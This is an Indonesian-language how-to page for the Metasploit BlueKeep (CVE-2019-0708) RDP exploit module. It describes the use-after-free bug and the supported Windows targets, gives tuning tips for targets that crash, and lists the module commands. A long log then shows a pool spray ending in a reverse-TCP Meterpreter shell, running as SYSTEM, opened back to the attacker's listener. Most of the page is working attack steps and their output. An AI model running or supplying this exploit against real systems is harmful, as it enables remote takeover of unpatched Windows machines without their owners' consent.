## cve_2019_0708_bluekeep_rce

Driver `termdd.sys` `RDP` tidak menangani binding dengan benar ke saluran internal-only `MS_T120`, memungkinkan pesan `Disconnect Provider Indication` yang cacat menyebabkan `use-after-free`. Dengan penyemprotan `nonpaged pool` jarak jauh yang dapat dikontrol untuk data/ukuran, gadget panggilan tidak langsung dari saluran yang telah dibebaskan digunakan untuk mencapai eksekusi kode arbitrer.

`Windows 7 SP1` dan `Windows Server 2008 R2` adalah satu-satunya target yang saat ini didukung.

`Windows 7 SP1` seharusnya dapat dieksploitasi dalam konfigurasi defaultnya, dengan asumsi pemilihan target Anda sesuai dengan tata letak memori sistem.

`HKLM\SYSTEM\CurrentControlSet\Control\TerminalServer\Winstations\RDP-Tcp\fDisableCam` harus disetel ke `0` agar eksploitasi berhasil terhadap `Windows Server 2008 R2`. Ini adalah konfigurasi non-standar untuk server normal, dan target akan crash jika kunci registri tersebut tidak disetel!

Jika target tetap crash, Anda kemungkinan perlu menentukan basis non-paged pool di memori kernel dan menetapkannya sebagai opsi GROOMBASE.

## Penulis
- Sean Dillon sean.dillon@risksense.com
- Ryan Hanson
- OJ Reeves oj@beyondbinary.io
- Brent Cook bcook@rapid7.com

## Platform
- `Windows`

## Cara Penggunaan di Metasploit

```
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set PAYLOAD <PAYLOAD>
set RHOSTS <IP_TARGET>
set RPORT 3389
set LHOST <IP_ATTACKER>
set LPORT <PORT_LISTENER>
set TARGET <ID>
set VERBOSE true
```

Hasil output-nya seperti ini:

```
[*] Started reverse TCP handler on 192.168.1.11:4444 
[*] 192.168.1.52:3389 - Running automatic check ("set AutoCheck false" to disable)
[*] 192.168.1.52:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
[*] 192.168.1.52:3389     - Verifying RDP protocol...
[*] 192.168.1.52:3389     - Attempting to connect using TLS security
[*] 192.168.1.52:3389     - Verifying RDP protocol...
[*] 192.168.1.52:3389     - Attempting to connect using TLS security
[*] 192.168.1.52:3389     - Detected RDP on 192.168.1.52:3389     (Windows version: 6.1.7601) (Requires NLA: No)
[*] 192.168.1.52:3389     - Sending erect domain request
[*] 192.168.1.52:3389     - Sending client info PDU
[*] 192.168.1.52:3389     - Received License packet (34 bytes)
[*] 192.168.1.52:3389     - Got license packet type 0xff (LICENSE_ERROR_ALERT)
[*] 192.168.1.52:3389     - License error/alert code 0x7 (LICENSE_ISSUED)
[*] 192.168.1.52:3389     - Waiting for Server Demand packet
[*] 192.168.1.52:3389     - Received Server Demand packet
[*] 192.168.1.52:3389     - Sending client confirm active PDU
[*] 192.168.1.52:3389     - Sending client synchronize PDU
[*] 192.168.1.52:3389     - Sending client control cooperate PDU
[*] 192.168.1.52:3389     - Sending client control request control PDU
[*] 192.168.1.52:3389     - Sending client input synchronize PDU
[*] 192.168.1.52:3389     - Sending client font list PDU
[*] 192.168.1.52:3389     - Sending patch check payloads
[+] 192.168.1.52:3389     - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 192.168.1.52:3389     - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.1.52:3389 - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 192.168.1.52:3389 - Verifying RDP protocol...
[*] 192.168.1.52:3389 - Attempting to connect using TLS security
[*] 192.168.1.52:3389 - Sending erect domain request
[*] 192.168.1.52:3389 - Sending client info PDU
[*] 192.168.1.52:3389 - Received License packet (34 bytes)
[*] 192.168.1.52:3389 - Got license packet type 0xff (LICENSE_ERROR_ALERT)
[*] 192.168.1.52:3389 - License error/alert code 0x7 (LICENSE_ISSUED)
[*] 192.168.1.52:3389 - Waiting for Server Demand packet
[*] 192.168.1.52:3389 - Received Server Demand packet
[*] 192.168.1.52:3389 - Sending client confirm active PDU
[*] 192.168.1.52:3389 - Sending client synchronize PDU
[*] 192.168.1.52:3389 - Sending client control cooperate PDU
[*] 192.168.1.52:3389 - Sending client control request control PDU
[*] 192.168.1.52:3389 - Sending client input synchronize PDU
[*] 192.168.1.52:3389 - Sending client font list PDU
[*] 192.168.1.52:3389 - Handling SERVER ANNOUNCE ...
[*] 192.168.1.52:3389 - Handling SERVER CAPABILITY ...
[*] 192.168.1.52:3389 - Handling CLIENT ID CONFIRM ...
[*] 192.168.1.52:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8013200000, Channel count 1.
[*] 192.168.1.52:3389 - Creating free trigger for user 13 on channel 1013
[!] 192.168.1.52:3389 - <---------------- | Entering Danger Zone | ---------------->
[*] 192.168.1.52:3389 - Surfing channels ...
[*] 192.168.1.52:3389 - Lobbing eggs ...
[*] 192.168.1.52:3389 - Sent 1/250 MB. (Time elapsed: 00:00:00)
[*] 192.168.1.52:3389 - Sent 2/250 MB. (Time elapsed: 00:00:00)
[*] 192.168.1.52:3389 - Sent 3/250 MB. (Time elapsed: 00:00:00)
[*] 192.168.1.52:3389 - Sent 4/250 MB. (Time elapsed: 00:00:00)
[*] 192.168.1.52:3389 - Sent 5/250 MB. (Time elapsed: 00:00:00)
[*] 192.168.1.52:3389 - Sent 6/250 MB. (Time elapsed: 00:00:00)
[*] 192.168.1.52:3389 - Sent 7/250 MB. (Time elapsed: 00:00:00)
[*] 192.168.1.52:3389 - Sent 8/250 MB. (Time elapsed: 00:00:01)
[*] 192.168.1.52:3389 - Sent 9/250 MB. (Time elapsed: 00:00:01)
[*] 192.168.1.52:3389 - Sent 10/250 MB. (Time elapsed: 00:00:01)
[*] 192.168.1.52:3389 - Sent 11/250 MB. (Time elapsed: 00:00:01)
[*] 192.168.1.52:3389 - Sent 12/250 MB. (Time elapsed: 00:00:01)
[*] 192.168.1.52:3389 - Sent 13/250 MB. (Time elapsed: 00:00:01)
[*] 192.168.1.52:3389 - Sent 14/250 MB. (Time elapsed: 00:00:02)
[*] 192.168.1.52:3389 - Sent 15/250 MB. (Time elapsed: 00:00:02)
[*] 192.168.1.52:3389 - Sent 16/250 MB. (Time elapsed: 00:00:02)
[*] 192.168.1.52:3389 - Sent 17/250 MB. (Time elapsed: 00:00:02)
[*] 192.168.1.52:3389 - Sent 18/250 MB. (Time elapsed: 00:00:02)
[*] 192.168.1.52:3389 - Sent 19/250 MB. (Time elapsed: 00:00:03)
[*] 192.168.1.52:3389 - Sent 20/250 MB. (Time elapsed: 00:00:03)
[*] 192.168.1.52:3389 - Sent 21/250 MB. (Time elapsed: 00:00:03)
[*] 192.168.1.52:3389 - Sent 22/250 MB. (Time elapsed: 00:00:03)
[*] 192.168.1.52:3389 - Sent 23/250 MB. (Time elapsed: 00:00:03)
[*] 192.168.1.52:3389 - Sent 24/250 MB. (Time elapsed: 00:00:03)
[*] 192.168.1.52:3389 - Sent 25/250 MB. (Time elapsed: 00:00:04)
[*] 192.168.1.52:3389 - Sent 26/250 MB. (Time elapsed: 00:00:04)
[*] 192.168.1.52:3389 - Sent 27/250 MB. (Time elapsed: 00:00:04)
[*] 192.168.1.52:3389 - Sent 28/250 MB. (Time elapsed: 00:00:04)
[*] 192.168.1.52:3389 - Sent 29/250 MB. (Time elapsed: 00:00:04)
[*] 192.168.1.52:3389 - Sent 30/250 MB. (Time elapsed: 00:00:05)
[*] 192.168.1.52:3389 - Sent 31/250 MB. (Time elapsed: 00:00:05)
[*] 192.168.1.52:3389 - Sent 32/250 MB. (Time elapsed: 00:00:05)
[*] 192.168.1.52:3389 - Sent 33/250 MB. (Time elapsed: 00:00:05)
[*] 192.168.1.52:3389 - Sent 34/250 MB. (Time elapsed: 00:00:05)
[*] 192.168.1.52:3389 - Sent 35/250 MB. (Time elapsed: 00:00:05)
[*] 192.168.1.52:3389 - Sent 36/250 MB. (Time elapsed: 00:00:06)
[*] 192.168.1.52:3389 - Sent 37/250 MB. (Time elapsed: 00:00:06)
[*] 192.168.1.52:3389 - Sent 38/250 MB. (Time elapsed: 00:00:06)
[*] 192.168.1.52:3389 - Sent 39/250 MB. (Time elapsed: 00:00:06)
[*] 192.168.1.52:3389 - Sent 40/250 MB. (Time elapsed: 00:00:06)
[*] 192.168.1.52:3389 - Sent 41/250 MB. (Time elapsed: 00:00:07)
[*] 192.168.1.52:3389 - Sent 42/250 MB. (Time elapsed: 00:00:07)
[*] 192.168.1.52:3389 - Sent 43/250 MB. (Time elapsed: 00:00:07)
[*] 192.168.1.52:3389 - Sent 44/250 MB. (Time elapsed: 00:00:07)
[*] 192.168.1.52:3389 - Sent 45/250 MB. (Time elapsed: 00:00:07)
[*] 192.168.1.52:3389 - Sent 46/250 MB. (Time elapsed: 00:00:07)
[*] 192.168.1.52:3389 - Sent 47/250 MB. (Time elapsed: 00:00:08)
[*] 192.168.1.52:3389 - Sent 48/250 MB. (Time elapsed: 00:00:08)
[*] 192.168.1.52:3389 - Sent 49/250 MB. (Time elapsed: 00:00:08)
[*] 192.168.1.52:3389 - Sent 50/250 MB. (Time elapsed: 00:00:08)
[*] 192.168.1.52:3389 - Sent 51/250 MB. (Time elapsed: 00:00:08)
[*] 192.168.1.52:3389 - Sent 52/250 MB. (Time elapsed: 00:00:08)
[*] 192.168.1.52:3389 - Sent 53/250 MB. (Time elapsed: 00:00:09)
[*] 192.168.1.52:3389 - Sent 54/250 MB. (Time elapsed: 00:00:09)
[*] 192.168.1.52:3389 - Sent 55/250 MB. (Time elapsed: 00:00:09)
[*] 192.168.1.52:3389 - Sent 56/250 MB. (Time elapsed: 00:00:09)
[*] 192.168.1.52:3389 - Sent 57/250 MB. (Time elapsed: 00:00:09)
[*] 192.168.1.52:3389 - Sent 58/250 MB. (Time elapsed: 00:00:10)
[*] 192.168.1.52:3389 - Sent 59/250 MB. (Time elapsed: 00:00:10)
[*] 192.168.1.52:3389 - Sent 60/250 MB. (Time elapsed: 00:00:10)
[*] 192.168.1.52:3389 - Sent 61/250 MB. (Time elapsed: 00:00:10)
[*] 192.168.1.52:3389 - Sent 62/250 MB. (Time elapsed: 00:00:10)
[*] 192.168.1.52:3389 - Sent 63/250 MB. (Time elapsed: 00:00:10)
[*] 192.168.1.52:3389 - Sent 64/250 MB. (Time elapsed: 00:00:11)
[*] 192.168.1.52:3389 - Sent 65/250 MB. (Time elapsed: 00:00:11)
[*] 192.168.1.52:3389 - Sent 66/250 MB. (Time elapsed: 00:00:11)
[*] 192.168.1.52:3389 - Sent 67/250 MB. (Time elapsed: 00:00:12)
[*] 192.168.1.52:3389 - Sent 68/250 MB. (Time elapsed: 00:00:12)
[*] 192.168.1.52:3389 - Sent 69/250 MB. (Time elapsed: 00:00:12)
[*] 192.168.1.52:3389 - Sent 70/250 MB. (Time elapsed: 00:00:12)
[*] 192.168.1.52:3389 - Sent 71/250 MB. (Time elapsed: 00:00:13)
[*] 192.168.1.52:3389 - Sent 72/250 MB. (Time elapsed: 00:00:13)
[*] 192.168.1.52:3389 - Sent 73/250 MB. (Time elapsed: 00:00:14)
[*] 192.168.1.52:3389 - Sent 74/250 MB. (Time elapsed: 00:00:15)
[*] 192.168.1.52:3389 - Sent 75/250 MB. (Time elapsed: 00:00:15)
[*] 192.168.1.52:3389 - Sent 76/250 MB. (Time elapsed: 00:00:15)
[*] 192.168.1.52:3389 - Sent 77/250 MB. (Time elapsed: 00:00:16)
[*] 192.168.1.52:3389 - Sent 78/250 MB. (Time elapsed: 00:00:16)
[*] 192.168.1.52:3389 - Sent 79/250 MB. (Time elapsed: 00:00:16)
[*] 192.168.1.52:3389 - Sent 80/250 MB. (Time elapsed: 00:00:17)
[*] 192.168.1.52:3389 - Sent 81/250 MB. (Time elapsed: 00:00:17)
[*] 192.168.1.52:3389 - Sent 82/250 MB. (Time elapsed: 00:00:17)
[*] 192.168.1.52:3389 - Sent 83/250 MB. (Time elapsed: 00:00:18)
[*] 192.168.1.52:3389 - Sent 84/250 MB. (Time elapsed: 00:00:18)
[*] 192.168.1.52:3389 - Sent 85/250 MB. (Time elapsed: 00:00:19)
[*] 192.168.1.52:3389 - Sent 86/250 MB. (Time elapsed: 00:00:19)
[*] 192.168.1.52:3389 - Sent 87/250 MB. (Time elapsed: 00:00:20)
[*] 192.168.1.52:3389 - Sent 88/250 MB. (Time elapsed: 00:00:20)
[*] 192.168.1.52:3389 - Sent 89/250 MB. (Time elapsed: 00:00:20)
[*] 192.168.1.52:3389 - Sent 90/250 MB. (Time elapsed: 00:00:21)
[*] 192.168.1.52:3389 - Sent 91/250 MB. (Time elapsed: 00:00:21)
[*] 192.168.1.52:3389 - Sent 92/250 MB. (Time elapsed: 00:00:22)
[*] 192.168.1.52:3389 - Sent 93/250 MB. (Time elapsed: 00:00:22)
[*] 192.168.1.52:3389 - Sent 94/250 MB. (Time elapsed: 00:00:23)
[*] 192.168.1.52:3389 - Sent 95/250 MB. (Time elapsed: 00:00:23)
[*] 192.168.1.52:3389 - Sent 96/250 MB. (Time elapsed: 00:00:23)
[*] 192.168.1.52:3389 - Sent 97/250 MB. (Time elapsed: 00:00:24)
[*] 192.168.1.52:3389 - Sent 98/250 MB. (Time elapsed: 00:00:24)
[*] 192.168.1.52:3389 - Sent 99/250 MB. (Time elapsed: 00:00:25)
[*] 192.168.1.52:3389 - Sent 100/250 MB. (Time elapsed: 00:00:26)
[*] 192.168.1.52:3389 - Sent 101/250 MB. (Time elapsed: 00:00:26)
[*] 192.168.1.52:3389 - Sent 102/250 MB. (Time elapsed: 00:00:26)
[*] 192.168.1.52:3389 - Sent 103/250 MB. (Time elapsed: 00:00:27)
[*] 192.168.1.52:3389 - Sent 104/250 MB. (Time elapsed: 00:00:27)
[*] 192.168.1.52:3389 - Sent 105/250 MB. (Time elapsed: 00:00:28)
[*] 192.168.1.52:3389 - Sent 106/250 MB. (Time elapsed: 00:00:28)
[*] 192.168.1.52:3389 - Sent 107/250 MB. (Time elapsed: 00:00:28)
[*] 192.168.1.52:3389 - Sent 108/250 MB. (Time elapsed: 00:00:29)
[*] 192.168.1.52:3389 - Sent 109/250 MB. (Time elapsed: 00:00:29)
[*] 192.168.1.52:3389 - Sent 110/250 MB. (Time elapsed: 00:00:30)
[*] 192.168.1.52:3389 - Sent 111/250 MB. (Time elapsed: 00:00:31)
[*] 192.168.1.52:3389 - Sent 112/250 MB. (Time elapsed: 00:00:31)
[*] 192.168.1.52:3389 - Sent 113/250 MB. (Time elapsed: 00:00:31)
[*] 192.168.1.52:3389 - Sent 114/250 MB. (Time elapsed: 00:00:32)
[*] 192.168.1.52:3389 - Sent 115/250 MB. (Time elapsed: 00:00:32)
[*] 192.168.1.52:3389 - Sent 116/250 MB. (Time elapsed: 00:00:33)
[*] 192.168.1.52:3389 - Sent 117/250 MB. (Time elapsed: 00:00:33)
[*] 192.168.1.52:3389 - Sent 118/250 MB. (Time elapsed: 00:00:33)
[*] 192.168.1.52:3389 - Sent 119/250 MB. (Time elapsed: 00:00:33)
[*] 192.168.1.52:3389 - Sent 120/250 MB. (Time elapsed: 00:00:34)
[*] 192.168.1.52:3389 - Sent 121/250 MB. (Time elapsed: 00:00:34)
[*] 192.168.1.52:3389 - Sent 122/250 MB. (Time elapsed: 00:00:34)
[*] 192.168.1.52:3389 - Sent 123/250 MB. (Time elapsed: 00:00:34)
[*] 192.168.1.52:3389 - Sent 124/250 MB. (Time elapsed: 00:00:35)
[*] 192.168.1.52:3389 - Sent 125/250 MB. (Time elapsed: 00:00:35)
[*] 192.168.1.52:3389 - Sent 126/250 MB. (Time elapsed: 00:00:36)
[*] 192.168.1.52:3389 - Sent 127/250 MB. (Time elapsed: 00:00:36)
[*] 192.168.1.52:3389 - Sent 128/250 MB. (Time elapsed: 00:00:36)
[*] 192.168.1.52:3389 - Sent 129/250 MB. (Time elapsed: 00:00:37)
[*] 192.168.1.52:3389 - Sent 130/250 MB. (Time elapsed: 00:00:37)
[*] 192.168.1.52:3389 - Sent 131/250 MB. (Time elapsed: 00:00:38)
[*] 192.168.1.52:3389 - Sent 132/250 MB. (Time elapsed: 00:00:38)
[*] 192.168.1.52:3389 - Sent 133/250 MB. (Time elapsed: 00:00:38)
[*] 192.168.1.52:3389 - Sent 134/250 MB. (Time elapsed: 00:00:38)
[*] 192.168.1.52:3389 - Sent 135/250 MB. (Time elapsed: 00:00:39)
[*] 192.168.1.52:3389 - Sent 136/250 MB. (Time elapsed: 00:00:39)
[*] 192.168.1.52:3389 - Sent 137/250 MB. (Time elapsed: 00:00:39)
[*] 192.168.1.52:3389 - Sent 138/250 MB. (Time elapsed: 00:00:40)
[*] 192.168.1.52:3389 - Sent 139/250 MB. (Time elapsed: 00:00:40)
[*] 192.168.1.52:3389 - Sent 140/250 MB. (Time elapsed: 00:00:40)
[*] 192.168.1.52:3389 - Sent 141/250 MB. (Time elapsed: 00:00:40)
[*] 192.168.1.52:3389 - Sent 142/250 MB. (Time elapsed: 00:00:41)
[*] 192.168.1.52:3389 - Sent 143/250 MB. (Time elapsed: 00:00:41)
[*] 192.168.1.52:3389 - Sent 144/250 MB. (Time elapsed: 00:00:42)
[*] 192.168.1.52:3389 - Sent 145/250 MB. (Time elapsed: 00:00:42)
[*] 192.168.1.52:3389 - Sent 146/250 MB. (Time elapsed: 00:00:43)
[*] 192.168.1.52:3389 - Sent 147/250 MB. (Time elapsed: 00:00:44)
[*] 192.168.1.52:3389 - Sent 148/250 MB. (Time elapsed: 00:00:44)
[*] 192.168.1.52:3389 - Sent 149/250 MB. (Time elapsed: 00:00:45)
[*] 192.168.1.52:3389 - Sent 150/250 MB. (Time elapsed: 00:00:45)
[*] 192.168.1.52:3389 - Sent 151/250 MB. (Time elapsed: 00:00:46)
[*] 192.168.1.52:3389 - Sent 152/250 MB. (Time elapsed: 00:00:46)
[*] 192.168.1.52:3389 - Sent 153/250 MB. (Time elapsed: 00:00:47)
[*] 192.168.1.52:3389 - Sent 154/250 MB. (Time elapsed: 00:00:47)
[*] 192.168.1.52:3389 - Sent 155/250 MB. (Time elapsed: 00:00:48)
[*] 192.168.1.52:3389 - Sent 156/250 MB. (Time elapsed: 00:00:48)
[*] 192.168.1.52:3389 - Sent 157/250 MB. (Time elapsed: 00:00:49)
[*] 192.168.1.52:3389 - Sent 158/250 MB. (Time elapsed: 00:00:50)
[*] 192.168.1.52:3389 - Sent 159/250 MB. (Time elapsed: 00:00:50)
[*] 192.168.1.52:3389 - Sent 160/250 MB. (Time elapsed: 00:00:51)
[*] 192.168.1.52:3389 - Sent 161/250 MB. (Time elapsed: 00:00:51)
[*] 192.168.1.52:3389 - Sent 162/250 MB. (Time elapsed: 00:00:51)
[*] 192.168.1.52:3389 - Sent 163/250 MB. (Time elapsed: 00:00:52)
[*] 192.168.1.52:3389 - Sent 164/250 MB. (Time elapsed: 00:00:52)
[*] 192.168.1.52:3389 - Sent 165/250 MB. (Time elapsed: 00:00:52)
[*] 192.168.1.52:3389 - Sent 166/250 MB. (Time elapsed: 00:00:52)
[*] 192.168.1.52:3389 - Sent 167/250 MB. (Time elapsed: 00:00:53)
[*] 192.168.1.52:3389 - Sent 168/250 MB. (Time elapsed: 00:00:53)
[*] 192.168.1.52:3389 - Sent 169/250 MB. (Time elapsed: 00:00:53)
[*] 192.168.1.52:3389 - Sent 170/250 MB. (Time elapsed: 00:00:53)
[*] 192.168.1.52:3389 - Sent 171/250 MB. (Time elapsed: 00:00:54)
[*] 192.168.1.52:3389 - Sent 172/250 MB. (Time elapsed: 00:00:54)
[*] 192.168.1.52:3389 - Sent 173/250 MB. (Time elapsed: 00:00:54)
[*] 192.168.1.52:3389 - Sent 174/250 MB. (Time elapsed: 00:00:54)
[*] 192.168.1.52:3389 - Sent 175/250 MB. (Time elapsed: 00:00:55)
[*] 192.168.1.52:3389 - Sent 176/250 MB. (Time elapsed: 00:00:55)
[*] 192.168.1.52:3389 - Sent 177/250 MB. (Time elapsed: 00:00:55)
[*] 192.168.1.52:3389 - Sent 178/250 MB. (Time elapsed: 00:00:56)
[*] 192.168.1.52:3389 - Sent 179/250 MB. (Time elapsed: 00:00:56)
[*] 192.168.1.52:3389 - Sent 180/250 MB. (Time elapsed: 00:00:56)
[*] 192.168.1.52:3389 - Sent 181/250 MB. (Time elapsed: 00:00:57)
[*] 192.168.1.52:3389 - Sent 182/250 MB. (Time elapsed: 00:00:57)
[*] 192.168.1.52:3389 - Sent 183/250 MB. (Time elapsed: 00:00:57)
[*] 192.168.1.52:3389 - Sent 184/250 MB. (Time elapsed: 00:00:57)
[*] 192.168.1.52:3389 - Sent 185/250 MB. (Time elapsed: 00:00:58)
[*] 192.168.1.52:3389 - Sent 186/250 MB. (Time elapsed: 00:00:58)
[*] 192.168.1.52:3389 - Sent 187/250 MB. (Time elapsed: 00:00:58)
[*] 192.168.1.52:3389 - Sent 188/250 MB. (Time elapsed: 00:00:59)
[*] 192.168.1.52:3389 - Sent 189/250 MB. (Time elapsed: 00:00:59)
[*] 192.168.1.52:3389 - Sent 190/250 MB. (Time elapsed: 00:00:59)
[*] 192.168.1.52:3389 - Sent 191/250 MB. (Time elapsed: 00:00:59)
[*] 192.168.1.52:3389 - Sent 192/250 MB. (Time elapsed: 00:00:59)
[*] 192.168.1.52:3389 - Sent 193/250 MB. (Time elapsed: 00:01:00)
[*] 192.168.1.52:3389 - Sent 194/250 MB. (Time elapsed: 00:01:00)
[*] 192.168.1.52:3389 - Sent 195/250 MB. (Time elapsed: 00:01:00)
[*] 192.168.1.52:3389 - Sent 196/250 MB. (Time elapsed: 00:01:00)
[*] 192.168.1.52:3389 - Sent 197/250 MB. (Time elapsed: 00:01:01)
[*] 192.168.1.52:3389 - Sent 198/250 MB. (Time elapsed: 00:01:01)
[*] 192.168.1.52:3389 - Sent 199/250 MB. (Time elapsed: 00:01:01)
[*] 192.168.1.52:3389 - Sent 200/250 MB. (Time elapsed: 00:01:01)
[*] 192.168.1.52:3389 - Sent 201/250 MB. (Time elapsed: 00:01:02)
[*] 192.168.1.52:3389 - Sent 202/250 MB. (Time elapsed: 00:01:02)
[*] 192.168.1.52:3389 - Sent 203/250 MB. (Time elapsed: 00:01:03)
[*] 192.168.1.52:3389 - Sent 204/250 MB. (Time elapsed: 00:01:03)
[*] 192.168.1.52:3389 - Sent 205/250 MB. (Time elapsed: 00:01:03)
[*] 192.168.1.52:3389 - Sent 206/250 MB. (Time elapsed: 00:01:04)
[*] 192.168.1.52:3389 - Sent 207/250 MB. (Time elapsed: 00:01:04)
[*] 192.168.1.52:3389 - Sent 208/250 MB. (Time elapsed: 00:01:04)
[*] 192.168.1.52:3389 - Sent 209/250 MB. (Time elapsed: 00:01:05)
[*] 192.168.1.52:3389 - Sent 210/250 MB. (Time elapsed: 00:01:05)
[*] 192.168.1.52:3389 - Sent 211/250 MB. (Time elapsed: 00:01:05)
[*] 192.168.1.52:3389 - Sent 212/250 MB. (Time elapsed: 00:01:05)
[*] 192.168.1.52:3389 - Sent 213/250 MB. (Time elapsed: 00:01:06)
[*] 192.168.1.52:3389 - Sent 214/250 MB. (Time elapsed: 00:01:06)
[*] 192.168.1.52:3389 - Sent 215/250 MB. (Time elapsed: 00:01:06)
[*] 192.168.1.52:3389 - Sent 216/250 MB. (Time elapsed: 00:01:06)
[*] 192.168.1.52:3389 - Sent 217/250 MB. (Time elapsed: 00:01:07)
[*] 192.168.1.52:3389 - Sent 218/250 MB. (Time elapsed: 00:01:07)
[*] 192.168.1.52:3389 - Sent 219/250 MB. (Time elapsed: 00:01:07)
[*] 192.168.1.52:3389 - Sent 220/250 MB. (Time elapsed: 00:01:08)
[*] 192.168.1.52:3389 - Sent 221/250 MB. (Time elapsed: 00:01:08)
[*] 192.168.1.52:3389 - Sent 222/250 MB. (Time elapsed: 00:01:08)
[*] 192.168.1.52:3389 - Sent 223/250 MB. (Time elapsed: 00:01:08)
[*] 192.168.1.52:3389 - Sent 224/250 MB. (Time elapsed: 00:01:09)
[*] 192.168.1.52:3389 - Sent 225/250 MB. (Time elapsed: 00:01:09)
[*] 192.168.1.52:3389 - Sent 226/250 MB. (Time elapsed: 00:01:10)
[*] 192.168.1.52:3389 - Sent 227/250 MB. (Time elapsed: 00:01:10)
[*] 192.168.1.52:3389 - Sent 228/250 MB. (Time elapsed: 00:01:10)
[*] 192.168.1.52:3389 - Sent 229/250 MB. (Time elapsed: 00:01:11)
[*] 192.168.1.52:3389 - Sent 230/250 MB. (Time elapsed: 00:01:11)
[*] 192.168.1.52:3389 - Sent 231/250 MB. (Time elapsed: 00:01:11)
[*] 192.168.1.52:3389 - Sent 232/250 MB. (Time elapsed: 00:01:11)
[*] 192.168.1.52:3389 - Sent 233/250 MB. (Time elapsed: 00:01:12)
[*] 192.168.1.52:3389 - Sent 234/250 MB. (Time elapsed: 00:01:12)
[*] 192.168.1.52:3389 - Sent 235/250 MB. (Time elapsed: 00:01:12)
[*] 192.168.1.52:3389 - Sent 236/250 MB. (Time elapsed: 00:01:12)
[*] 192.168.1.52:3389 - Sent 237/250 MB. (Time elapsed: 00:01:12)
[*] 192.168.1.52:3389 - Sent 238/250 MB. (Time elapsed: 00:01:13)
[*] 192.168.1.52:3389 - Sent 239/250 MB. (Time elapsed: 00:01:13)
[*] 192.168.1.52:3389 - Sent 240/250 MB. (Time elapsed: 00:01:13)
[*] 192.168.1.52:3389 - Sent 241/250 MB. (Time elapsed: 00:01:13)
[*] 192.168.1.52:3389 - Sent 242/250 MB. (Time elapsed: 00:01:13)
[*] 192.168.1.52:3389 - Sent 243/250 MB. (Time elapsed: 00:01:14)
[*] 192.168.1.52:3389 - Sent 244/250 MB. (Time elapsed: 00:01:14)
[*] 192.168.1.52:3389 - Sent 245/250 MB. (Time elapsed: 00:01:14)
[*] 192.168.1.52:3389 - Sent 246/250 MB. (Time elapsed: 00:01:14)
[*] 192.168.1.52:3389 - Sent 247/250 MB. (Time elapsed: 00:01:15)
[*] 192.168.1.52:3389 - Sent 248/250 MB. (Time elapsed: 00:01:15)
[*] 192.168.1.52:3389 - Sent 249/250 MB. (Time elapsed: 00:01:15)
[*] 192.168.1.52:3389 - Sent 250/250 MB. (Time elapsed: 00:01:15)
[*] 192.168.1.52:3389 - Forcing the USE of FREE'd object ...
[!] 192.168.1.52:3389 - <---------------- | Leaving Danger Zone | ---------------->
[*] Sending stage (203846 bytes) to 192.168.1.52
[*] Meterpreter session 6 opened (192.168.1.11:4444 -> 192.168.1.52:49405) at 2025-05-17 09:39:33 +0700

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```

## Referensi
- [Rapid7](https://www.rapid7.com/db/modules/exploit/windows/rdp/cve_2019_0708_bluekeep_rce/)
